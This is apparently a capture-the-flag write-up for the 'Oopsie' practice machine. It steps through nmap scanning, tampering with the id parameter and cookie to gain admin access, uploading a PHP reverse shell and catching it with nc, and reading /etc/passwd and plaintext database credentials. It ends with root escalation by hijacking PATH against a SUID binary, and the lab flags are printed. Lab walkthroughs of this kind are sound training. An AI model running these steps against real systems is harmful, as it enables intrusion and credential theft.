![oopsie.jpg](/assets/oopsie.jpg)

1. Send an ICMP echo request to machine's IP address..
```bash
┌──(kali㉿kali)-[~]
└─$ ping -c 2 10.129.87.40
```

2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.129.107.26
```

**Output**
```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```


3. View the web page
![oopsie-web.PNG](/assets/oopsie-web.PNG)


4. With **BurpSuite** view petitions of web page and look anothers directorys

![oopsie-burp.PNG](/assets/oopsie-burp.PNG)


5. Access to new directory
![oopsie-login.PNG](/assets/oopsie-login.PNG)


6. Access as **Guest** and in **clients** look the url
![oopsie-guest.PNG](/assets/oopsie-guest.PNG)


7. We can edit the **id**, if you put **1** you can access as **administrator**.
![oopsie-admin.PNG](/assets/oopsie-admin.PNG)


8. For keep session as **administrator** edit the cookie
![oopsie-cookie.PNG](/assets/oopsie-cookie.PNG)
> With this you can keep session in any part of web page.

9. In **uploads** we load a php reverse shell
![oopsie-upload.PNG](/assets/oopsie-upload.PNG)
First, go to `/usr/share/webshells/php/php-reverse-shell.php`copy this file and put in directory's machine.
Next, edit the file and put in `$IP` the IP address of tun0 and in `$PORT` put 4444

![oopsie-php.PNG](/assets/oopsie-php.PNG)

Finally, upload the file.


10. Use **gobuster** to discover others directories to access
```bash
┌──(root㉿est)-[/home/kali/Desktop/Oopsie]
└─| gobuster dir -u http://10.129.107.26 -w /usr/share/dirb/wordlists/small.txt 
```

**Output**
```bash
/css                  (Status: 301) [Size: 312] [--> http://10.129.107.26/css/]
/images               (Status: 301) [Size: 315] [--> http://10.129.107.26/images/]
/js                   (Status: 301) [Size: 311] [--> http://10.129.107.26/js/]    
/uploads              (Status: 301) [Size: 316] [--> http://10.129.107.26/uploads/]
```

11. With **nc** listen on port 4444.
```bash
┌──(root㉿est)-[/home/kali/Desktop/Oopsie]
└─| nc -lvnp 4444 
```

12. Execute the php-reverse-shell.php in url

![oopsie-reverse-url.PNG](/assets/oopsie-reverse-url.PNG)

13. Run this
```bash
$ python3 -c "import pty; pty.spawn('/bin/bash')"
```

14. Look `/etc/passwd`
```bash
www-data@oopsie:/$ cat /etc/passwd
```

**Output**
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
robert:x:1000:1000:robert:/home/robert:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
```
> Find important information

15. Acces to robert's directory and find a **user flag**

```bash
www-data@oopsie:/home/robert$ cat user.txt
cat user.txt
f2c74ee8db7983851ab2a96a44eb7981
```

16. Go to `www-data@oopsie:/$ cd /var/www/html`, (In this folder you found a files of web page)
```bash
www-data@oopsie:/var/www/html$ dir
dir
cdn-cgi  css  fonts  images  index.php  js  themes  uploads
```

17. Enter in `cdn-cgi`, next in `login` and cat a **db.php** file.
```bash
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php
cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

18. With the credentials loggin how robert user
```bash
www-data@oopsie:/var/www/html/cdn-cgi/login$ su robert
su robert
Password: M3g4C0rpUs3r!
```

19. Search more information of **robert**
```bash
robert@oopsie:/var/www/html/cdn-cgi/login$ id
id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

20. Try to access a **bugtracker** group
```bash
robert@oopsie:/var/www/html/cdn-cgi/login$ bugtracker
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: /bin/bash
/bin/bash
---------------

cat: /root/reports//bin/bash: No such file or directory
```
For login it execute **cat**, but, if we change the functioning of cat can spawn a `/bin/bash`

21. Change the functionning of **cat**
```bash
robert@oopsie:/var/www/html/cdn-cgi/login$ cd /tmp 
cd /tmp
robert@oopsie:/tmp$ echo '/bin/bash' > cat
echo '/bin/bash' > cat
robert@oopsie:/tmp$ chmod +x cat
chmod +x cat
robert@oopsie:/tmp$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
```
Whit this change a cat with other environment variable

22. Try to login in **bugtracker** group and in **Provide Bug ID** put any number
```bash
robert@oopsie:/var/www/html/cdn-cgi/login$ bugtracker
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 2
---------------
```

**Output**
```bash
root@oopsie:/tmp#
```

23. Now are root
```bash
root@oopsie:/# cd root
cd root
root@oopsie:/root# dir
dir
reports  root.txt
root@oopsie:/root# cat root.txt
cat root.txt
root@oopsie:/root# head root.txt
head root.txt
af13b0bee69f8a877c3faf667f7beacf
```

+ **cat** not read files because alter the functioning, also you can use **head** or **tail**.
